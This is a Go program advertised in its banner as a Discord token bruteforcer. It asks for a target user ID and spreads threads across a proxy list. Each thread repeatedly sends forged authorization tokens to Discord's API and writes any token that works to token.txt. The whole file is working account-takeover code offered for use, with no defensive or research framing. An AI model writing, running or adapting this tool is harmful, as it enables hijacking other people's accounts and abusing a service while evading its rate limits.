package main

import (
    "bufio"
    "encoding/base64"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "os/exec"
    "runtime"
    "sync"
    "time"
    "strings"
)

var characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"


func readProxiesFromFile(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var proxies []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        proxies = append(proxies, scanner.Text())
    }

    return proxies, scanner.Err()
}

func isProxyValid(proxy string) bool {
    // Use https://httpbin.org/ip as the test URL because it returns the requester's IP address
    testURL := "https://httpbin.org/ip"

    proxyURL, err := url.Parse(proxy)
    if err != nil {
        fmt.Println("[-] Invalid proxy URL:", proxy)
        return false
    }

    // Hide sensitive parts of the proxy URL
    hiddenProxy := hideSensitiveParts(proxyURL)

    client := &http.Client{
        Transport: &http.Transport{
            Proxy: http.ProxyURL(proxyURL),
        },
        Timeout: 5 * time.Second, // Set a timeout to avoid waiting too long for slow proxies
    }

    resp, err := client.Get(testURL)
    if err != nil {
        fmt.Println("[-] Proxy error:", err)
        return false
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        fmt.Println("[-] Proxy returned non-200 status code:", resp.StatusCode)
        return false
    }

    // ANSI escape code for pink color
    pink := "\033[38;5;200m"
    reset := "\033[0m"

    fmt.Println(pink + "[+] Proxy validated: " + hiddenProxy + reset)

    return true
}

func hideSensitiveParts(u *url.URL) string {
    if u.User != nil {
        return strings.ReplaceAll(u.String(), u.User.String()+"@", "****@")
    }
    return u.String()
}

func clearConsole() {
    var cmd *exec.Cmd
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/c", "cls")
    } else {
        cmd = exec.Command("clear")
    }
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func startupScreen(totalProxies int, proxies []string) {
    // ANSI escape code for pink color
    pink := "\033[38;5;200m"
    reset := "\033[0m"

    // ASCII loading screen and credits
    loadingScreen := `
    ╦ ╦┌─┐┌─┐┬─┐
    ║ ║└─┐├┤ ├┬┘
    ╚═╝└─┘└─┘┴└─
                                                                                
    ╔═══════════════════════════════════════════════╗
    ║ User319183 | discord.gg/voidgen               ║
    ║ The best Discord token bruteforcer out there! ║
    ╚═══════════════════════════════════════════════╝                                                 
    `

    credits := "Created by User319183"

    fmt.Println(pink + loadingScreen + reset)
    fmt.Printf("%sProxies Loaded: %d%s\n", pink, totalProxies, reset)

    validProxies := make([]string, 0, len(proxies))
    for _, proxy := range proxies {
        if isProxyValid(proxy) {
            validProxies = append(validProxies, proxy)
        }
    }

    fmt.Printf("%sProxies Valid: %d%s\n", pink, len(validProxies), reset)
    fmt.Println(pink + credits + reset)
}

func base64Encode(input string) string {
    return strings.TrimRight(base64.StdEncoding.EncodeToString([]byte(input)), "=")
}

func generateRandomToken(idEncoded string, wg *sync.WaitGroup, proxyURL *url.URL) {
    defer wg.Done()

    api := "https://discord.com/api/v9/users/@me"

    client := &http.Client{
        Transport: &http.Transport{
            Proxy: http.ProxyURL(proxyURL),
        },
    }

    for {
        timestamp := base64Encode(fmt.Sprint(time.Now().Unix()))
        randomSignature := base64.StdEncoding.EncodeToString([]byte(randomString(27)))

        token := fmt.Sprintf("%s.%s.%s", idEncoded, timestamp, randomSignature)
        req, _ := http.NewRequest("GET", api, nil)
        req.Header.Set("authorization", token)

        resp, err := client.Do(req)
        if err != nil {
            fmt.Println("[-] Error:", err)
            time.Sleep(1 * time.Second)
            continue
        }

        if resp.StatusCode == http.StatusOK {
            fmt.Println("[+] Token Found:", token)
            err := os.WriteFile("token.txt", []byte(token), 0644)
            if err != nil {
                fmt.Println("[-] Error writing token to file:", err)
            }
            os.Exit(0)
        } else {
            fmt.Println("[-] Incorrect Token:", token)
            time.Sleep(1 * time.Second)
        }
    }
}

func randomString(length int) string {
    result := make([]byte, length)
    for i := range result {
        result[i] = characters[rand.Intn(len(characters))]
    }
    return string(result)
}


func main() {
    clearConsole()

    proxies, err := readProxiesFromFile("proxies.txt")
    if err != nil {
        fmt.Println("[-] Error reading proxies from file:", err)
        return
    }

    startupScreen(len(proxies), proxies)

    fmt.Print("Enter the user ID: ")
    var id string
    fmt.Scanln(&id)
    idEncoded := base64Encode(id)

    fmt.Print("Number of threads per proxy: ")
    var numThreads int
    _, err = fmt.Scanln(&numThreads)
    if err != nil {
        fmt.Println("[-] Error reading number of threads:", err)
        return
    }

    var wg sync.WaitGroup
    for _, proxy := range proxies {
        proxyURL, err := url.Parse(proxy)
        if err != nil {
            fmt.Println("[-] Invalid proxy:", proxy)
            continue
        }
        for i := 0; i < numThreads; i++ {
            wg.Add(1)
            go generateRandomToken(idEncoded, &wg, proxyURL)
        }
    }
    wg.Wait()
}